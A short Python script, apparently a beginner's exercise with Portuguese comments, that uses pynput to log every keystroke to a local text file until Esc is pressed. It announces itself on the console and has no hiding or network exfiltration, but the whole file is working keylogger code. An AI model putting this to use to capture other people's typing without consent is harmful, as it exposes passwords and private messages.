from pynput import keyboard
import time

IGNORAR = {
    keyboard.Key.shift,
    keyboard.Key.shift_r,
    keyboard.Key.ctrl_l,
    keyboard.Key.ctrl_r,
    keyboard.Key.alt_l,
    keyboard.Key.alt_r,
    keyboard.Key.caps_lock,
    keyboard.Key.cmd
}

def on_press(key):
    try:
        # CORREÇÃO: A escrita está agora apenas UMA VEZ
        with open("log.txt", "a", encoding="utf-8") as f:
            f.write(key.char)
            
    except AttributeError:
        with open("log.txt", "a", encoding="utf-8") as f: # Corrigido utf-9 para utf-8
            
            if key == keyboard.Key.space:
                f.write(" ")
            
            elif key == keyboard.Key.enter:
                f.write("\n")
            
            elif key == keyboard.Key.tab:
                f.write("\t")
            
            elif key == keyboard.Key.backspace:
                f.write(" ")
                
            elif key == keyboard.Key.esc:
                f.write(" [ESC] ")
                
            elif key in IGNORAR:
                pass
                
            else:
                f.write(f"[{key}] ") 
                
def on_release(key):
    if key == keyboard.Key.esc:
        return False
        
if __name__ == "__main__":
    print("Keylogger iniciado. Pressione 'Esc' para parar.")
    
    with keyboard.Listener(
            on_press=on_press,
            on_release=on_release) as listener:
        listener.join()
        
    print("Keylogger parado.")